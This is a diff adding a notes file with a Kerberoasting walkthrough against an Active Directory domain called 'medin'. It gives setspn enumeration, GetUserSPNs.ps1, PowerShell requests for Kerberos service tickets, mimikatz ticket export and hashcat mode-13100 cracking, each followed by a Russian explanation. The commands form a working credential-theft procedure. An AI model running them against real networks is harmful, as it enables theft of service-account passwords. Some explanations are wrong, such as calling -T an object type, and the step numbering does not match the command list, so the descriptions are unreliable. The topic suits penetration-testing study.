@@ -1,0 +1,24 @@
+Command:
+1. setspn -T medin -Q */*
+2. .\GetUserSPNs.ps1
+3. Add-Type -AssemblyName System.IdentityModel
+4. setspn.exe -T medin.local -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }  
+5. mimikatz # kerberos::list /export
+6. cd ./hashcat
+.\hashcat.exe .\john-hashcat-crackfile.txt -m 13100 .\wordlist.txt
+Desc:
+
+1. setspn -T medin -Q /
+   Команда setspn используется для управления представительственными именами службных принципалов (SPN) в доменной среде Windows. В данном случае, с флагом -T указывается тип объекта (medin), а флаг -Q выполняет запрос на сервере (/) для получения информации о SPN. В целом, эта команда позволяет исследовать конфигурацию служб и принципалов в домене.
+
+2. .\GetUserSPNs.ps1
+   GetUserSPNs.ps1 - это скрипт PowerShell, предназначенный для извлечения учетных записей служб из доменного контроллера Active Directory, которые могут быть уязвимы для атак типа "Kerberoasting". Он помогает определить службы, для которых можно извлечь хэши сервисных аккаунтов и попытаться их взломать.
+
+3. Add-Type -AssemblyName System.IdentityModel
+   Эта команда используется в PowerShell для загрузки сборки System.IdentityModel, которая предоставляет классы и методы для работы с безопасностью и токенами, включая Kerberos. Затем выполняется команда setspn.exe с определенными параметрами, и результаты обрабатываются с использованием класса System.IdentityModel.Tokens.KerberosRequestorSecurityToken для создания нового токена безопасности.
+
+4. mimikatz # kerberos::list /export
+   Мимикатз (mimikatz) - это инструмент для извлечения учетных данных из системы, включая хэши паролей и информацию о Kerberos. В данном случае, команда kerberos::list используется для перечисления учетных записей Kerberos и /export указывает на сохранение результатов в файл для дальнейшего анализа.
+
+5. .\hashcat.exe .\john-hashcat-crackfile.txt -m 13100 .\wordlist.txt
+   Hashcat - это инструмент для взлома паролей, который использует атаку грубой силы, перебирая различные комбинации паролей. Команда в данном случае указывает на использование hashcat.exe для взлома хэшей паролей из файла john-hashcat-crackfile.txt с помощью метода хэширования 13100 и использование wordlist.txt в качестве списка паролей для проверки.
